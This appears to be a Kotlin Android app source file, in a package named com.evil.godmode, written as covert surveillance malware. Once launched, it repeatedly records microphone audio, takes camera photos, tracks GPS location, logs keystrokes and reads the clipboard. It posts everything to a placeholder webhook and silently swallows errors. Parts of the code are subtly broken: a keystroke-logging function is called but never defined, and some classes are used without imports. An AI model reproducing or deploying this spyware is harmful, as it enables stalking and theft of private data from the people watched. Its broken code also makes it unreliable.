package com.evil.godmode

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.Camera
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Bundle
import android.view.KeyEvent
import android.view.Window
import android.view.WindowManager
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.Timer
import java.util.TimerTask

class MainActivity : Activity(), LocationListener {

    private var camera: Camera? = null
    private var mediaRecorder: MediaRecorder? = null
    private val locationManager: LocationManager by lazy { getSystemService(Context.LOCATION_SERVICE) as LocationManager }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        setContentView(R.layout.activity_main) 
        startTotalSurveillance()
    }

    private fun startTotalSurveillance() {
        // AUDIO
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                try {
                    val file = File(filesDir, "audio_${System.currentTimeMillis()}.amr")
                    mediaRecorder = MediaRecorder().apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(OutputFormat.AMR_NB)
                        setAudioEncoder(AudioEncoder.AMR_NB)
                        outputFile = file.absolutePath
                        prepare()
                        start()
                    }
                    Thread.sleep(60000) 
                    mediaRecorder?.stop()
                    uploadToWebhook(file)
                    file.delete()
                } catch (e: Exception) {} finally {
                    mediaRecorder?.release()
                }
            }
        }, 0, 120000) 

        // CAMERA
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                try {
                    camera = Camera.open()
                    camera!!.takePicture(null, null, { data, _ ->
                        val file = File(filesDir, "cam_${System.currentTimeMillis()}.jpg")
                        file.writeBytes(data)
                        uploadToWebhook(file)
                        file.delete()
                    }, null)
                    camera!!.release()
                } catch (e: Exception) {}
            }
        }, 0, 10000) 

        // LOCATION
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 0f, this)

        // KEYSTROKE & CLIPBOARD
        startKeystrokeLogging()
        startClipboardSniffing()
    }

    override fun onLocationChanged(location: Location?) {
        if (location != null) {
            uploadData(mapOf("type" to "location", "lat" to location.latitude.toString(), "lon" to location.longitude.toString()))
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        uploadData(mapOf("type" to "keystroke", "key" to event?.getUnicodeChar()?.toChar()))
        return super.onKeyDown(keyCode, event)
    }

    private fun startClipboardSniffing() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                val clip = clipboard.primaryClip
                if (clip != null && clip.itemCount > 0) {
                    val text = clip.getItemAt(0).text?.toString()
                    if (!text.isNullOrEmpty()) {
                        uploadData(mapOf("type" to "clipboard", "data" to text))
                    }
                }
            }
        }, 0, 2000) 
    }

    private fun uploadToWebhook(file: File) {
        try {
            val url = URL("https://YOUR_WEBHOOK_URL.com/upload")
            val connection = url.openConnection() as HttpURLConnection
            connection.doInput = true
            connection.doOutput = true
            connection.setRequestMethod("POST")
            val inputStream = file.inputStream()
            val output = connection.outputStream
            val buffer = ByteArray(1024)
            var length: Int
            while (inputStream.read(buffer).also { length = it } > 0) {
                output.write(buffer, 0, length)
            }
            inputStream.close()
            output.close()
            file.delete()
        } catch (e: java.io.IOException) {}
    }

    private fun uploadData(jsonPayload: Map<String, String>) {
        try {
            val json = "{\"payload\": ${jsonPayload.toString()}}"
            val url = URL("https://YOUR_WEBHOOK_URL.com/data")
            val connection = url.openConnection() as HttpURLConnection
            connection.doInput = true
            connection.doOutput = true
            connection.setRequestMethod("POST")
            connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8")
            val outputStream = connection.outputStream
            outputStream.write(json.toByteArray())
            outputStream.close()
        } catch (e: Exception) {}
    }
}
